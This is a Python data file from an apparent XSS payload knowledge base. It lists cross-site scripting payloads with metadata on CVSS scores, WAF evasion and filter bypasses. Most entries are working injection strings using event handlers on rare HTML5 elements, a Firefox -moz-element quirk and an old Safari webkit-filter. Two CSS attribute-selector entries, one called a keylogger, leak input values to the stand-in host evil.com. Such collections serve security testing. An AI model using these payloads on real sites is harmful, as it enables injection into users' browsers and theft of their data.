#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Absolute Final XSS Payloads - Part 1
Academic research, browser-specific quirks, and HTML5 elements (part 1).
"""

from ..models import PayloadEntry


BRS_KB_ABSOLUTE_FINAL_PAYLOADS_PART1 = {
    # ============================================================
    # ACADEMIC RESEARCH PAYLOADS
    # ============================================================
    "academic-css-exfil-1": PayloadEntry(
        payload='<style>input[value^="a"]{background:url(//evil.com?a)}</style>',
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="CSS attribute selector exfiltration",
        tags=["academic", "css", "exfil"],
        bypasses=["csp"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "academic-css-keylogger": PayloadEntry(
        payload='<style>input[value$="a"]{background:url(//evil.com?key=a)}</style>',
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="CSS keylogger via attribute selector",
        tags=["academic", "css", "keylogger"],
        bypasses=["csp"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "academic-timing-attack": PayloadEntry(
        payload="performance.now()>0&&alert(1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Timing-based side effect",
        tags=["academic", "timing"],
        bypasses=["side_effect_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "academic-spectre-style": PayloadEntry(
        payload="new SharedArrayBuffer(1024)",
        contexts=["javascript"],
        severity="low",
        cvss_score=4.0,
        description="SharedArrayBuffer for timing (Spectre mitigation)",
        tags=["academic", "spectre"],
        bypasses=["buffer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox"],
        reliability="low",
    ),
    # ============================================================
    # BROWSER-SPECIFIC QUIRKS (CHROME)
    # ============================================================
    "chrome-devtools-override": PayloadEntry(
        payload="console.log(alert(1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Console.log with side effect",
        tags=["chrome", "console"],
        bypasses=["console_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "chrome-copy-command": PayloadEntry(
        payload="document.execCommand('copy')||alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="execCommand copy with fallback",
        tags=["chrome", "execCommand"],
        bypasses=["command_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # BROWSER-SPECIFIC QUIRKS (FIREFOX)
    # ============================================================
    "firefox-moz-element": PayloadEntry(
        payload='<div style="background:-moz-element(#x)"></div><img id=x src=x onerror=alert(1)>',
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="Firefox -moz-element CSS",
        tags=["firefox", "moz-element"],
        bypasses=["style_filters"],
        waf_evasion=True,
        browser_support=["firefox"],
        reliability="medium",
    ),
    "firefox-innerText-getter": PayloadEntry(
        payload="Object.getOwnPropertyDescriptor(HTMLElement.prototype,'innerText').get.call(document.body)",
        contexts=["javascript"],
        severity="low",
        cvss_score=4.0,
        description="innerText getter access",
        tags=["firefox", "getter"],
        bypasses=["property_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # BROWSER-SPECIFIC QUIRKS (SAFARI)
    # ============================================================
    "safari-webkit-filter": PayloadEntry(
        payload='<div style="-webkit-filter:url(javascript:alert(1))">',
        contexts=["html_content", "css_injection"],
        severity="high",
        cvss_score=7.5,
        description="Safari webkit-filter (old)",
        tags=["safari", "webkit"],
        bypasses=["style_filters"],
        waf_evasion=True,
        browser_support=["safari"],
        reliability="low",
    ),
    # ============================================================
    # EXTREMELY RARE HTML5 ELEMENTS
    # ============================================================
    "html5-data-element": PayloadEntry(
        payload='<data value="x" onclick="alert(1)">click</data>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 data element",
        tags=["html5", "data"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-time-element": PayloadEntry(
        payload='<time onclick="alert(1)">click</time>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 time element",
        tags=["html5", "time"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-output-element": PayloadEntry(
        payload='<output onfocus="alert(1)" tabindex=0>focus</output>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 output element",
        tags=["html5", "output"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-meter-element": PayloadEntry(
        payload='<meter onclick="alert(1)" value="0.5">click</meter>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 meter element",
        tags=["html5", "meter"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-progress-element": PayloadEntry(
        payload='<progress onclick="alert(1)" value="50" max="100">click</progress>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 progress element",
        tags=["html5", "progress"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-ruby-element": PayloadEntry(
        payload='<ruby onclick="alert(1)"><rb>x</rb><rt>y</rt></ruby>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 ruby element",
        tags=["html5", "ruby"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-wbr-element": PayloadEntry(
        payload='<wbr onclick="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 wbr element",
        tags=["html5", "wbr"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-bdi-element": PayloadEntry(
        payload='<bdi onclick="alert(1)">click</bdi>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 bdi element",
        tags=["html5", "bdi"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-bdo-element": PayloadEntry(
        payload='<bdo dir="rtl" onclick="alert(1)">click</bdo>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 bdo element",
        tags=["html5", "bdo"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
}
